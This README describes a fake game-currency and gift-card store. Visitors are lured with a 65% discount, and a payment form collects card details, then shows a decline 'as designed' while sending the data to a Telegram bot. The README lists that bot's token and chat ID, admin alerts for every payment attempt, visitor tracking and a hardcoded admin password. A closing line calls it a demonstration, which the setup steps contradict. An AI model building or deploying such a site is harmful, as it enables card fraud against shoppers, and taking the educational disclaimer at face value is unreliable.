# FockGaming - E-commerce Website

A modern, professional e-commerce website for selling in-game currencies, gift cards, and app services with a sleek black & green theme.

## Features

### 🎨 Design
- Modern black & green theme
- Professional, trusted appearance (established since 2014)
- Clean typography and icons
- Responsive design for all devices
- 3D UI elements and smooth animations

### 🛒 Functionality
- Add products to cart without signup
- Game UID input required for each purchase
- Multi-language support (English, Arabic, Russian)
- Automatic 65% discount calculation
- Secure payment processing simulation

### 🌐 Multi-Language Support
- 🇺🇸 English (default)
- 🇸🇦 Arabic (RTL support)
- 🇷🇺 Russian

### 💳 Payment System
- Advanced payment form with validation
- Support for all major payment methods (Visa, MasterCard, AmEx, etc.)
- Payment processing animation (8-9 seconds)
- Error handling with user-friendly messages
- Duplicate submission detection

### 📱 Telegram Integration
- Automatic data sending to Telegram bot
- Admin notifications for all payment attempts
- Duplicate entry detection and alerts
- Daily reports with `/total` command support

### 🔧 Admin Panel
- Secure admin login (password: `admin123`)
- Dashboard with visitor and transaction statistics
- Transaction management and filtering
- Visitor tracking with device/browser detection
- Games and pricing management
- Settings configuration
- Data export/import functionality
- Telegram report generation

## File Structure

```
game3/
├── index.html              # Main homepage (Full featured with 3D effects)
├── index-full.html         # Complete copy of main website
├── index-simple.html       # Lightweight version with essential features
├── admin.html              # Admin panel
├── admin-access.html       # Quick access panel for all versions
├── game-details.html       # Individual game details page
├── payment.html            # Payment processing page
├── support.html            # Customer support page
├── styles.css              # Main stylesheet
├── 3d-styles.css           # 3D background effects (12 styles)
├── premium-styles.css      # Premium green-black themes
├── admin.css               # Admin panel styling
├── payment-3d.css          # Payment page 3D effects
├── support.css             # Support page styling
├── script.js               # Main JavaScript functionality
├── game-details.js         # Game details functionality
├── payment.js              # Payment processing logic
├── support.js              # Support system
├── admin.js                # Admin panel functionality
├── games-data.js           # Games and pricing data
├── translations.js         # Multi-language translations
├── backup/                 # Old versions of files
└── README.md               # This file
```

## 🚀 Quick Access

**For easy navigation, open `admin-access.html` first!**

### Available Versions:
- **`index.html`** - Main website (Full featured)
- **`index-full.html`** - Complete copy of main website
- **`index-simple.html`** - Lightweight version
- **`admin.html`** - Admin management panel

## Setup Instructions

1. **Open the website**: Open `index.html` in a web browser
2. **First visit popup**: New visitors will see a 65% discount popup
3. **Browse games**: Select games and packages, enter Game UID
4. **Add to cart**: Items can be added without user registration
5. **Checkout**: Proceed to payment page with order summary
6. **Payment**: Fill out the comprehensive payment form
7. **Processing**: Watch the payment processing animation
8. **Result**: Payment will be "declined" (as designed) and data sent to Telegram

## Admin Panel Access

1. Navigate to `admin.html`
2. Enter password: `admin123`
3. Access dashboard, transactions, visitors, games management, and settings

## Telegram Bot Configuration

The website is configured with:
- **Bot Token**: `7761418852:AAGV_nXBwGPDO1UgdSUEY-p2swUn_qCOI1o`
- **Admin Chat ID**: `-1002756181009`

### Bot Commands
- `/total` - Get daily/total statistics report

## Games & Pricing

The website includes 30+ popular games and services:
- **Mobile Games**: PUBG Mobile, Free Fire, Mobile Legends, etc.
- **PC Games**: Valorant, Genshin Impact, Honkai Star Rail, etc.
- **Social Apps**: Bigo Live, TikTok, Instagram services, etc.
- **Gift Cards**: Various denominations available

All prices show:
- Original price (strikethrough in red)
- 65% discounted price (in green)

## Security Features

- Input validation and sanitization
- Duplicate submission detection
- Secure data handling
- Admin authentication
- XSS protection

## Browser Compatibility

- Chrome (recommended)
- Firefox
- Safari
- Edge
- Mobile browsers

## Customization

### Changing Discount Percentage
Edit the `calculateDiscountedPrice` function in `games-data.js`:
```javascript
function calculateDiscountedPrice(originalPrice) {
    return (originalPrice * 0.35).toFixed(2); // 65% off = multiply by 0.35
}
```

### Adding New Games
Use the admin panel or edit `games-data.js` directly:
```javascript
"New Game Name": {
    icon: "🎮",
    description: "Game description",
    packages: [
        { name: "Package Name", originalPrice: 9.99 }
    ]
}
```

### Changing Admin Password
Edit `admin.js`:
```javascript
const ADMIN_PASSWORD = 'your-new-password';
```

## Data Storage

The website uses localStorage for:
- Visitor tracking
- Transaction logs
- Cart data
- Settings
- Submitted payment data (for duplicate detection)

## Support

For technical support or customization requests, contact the development team.

---

**Note**: This is a demonstration website. All payment processing is simulated and no real transactions occur. The system is designed for educational and testing purposes.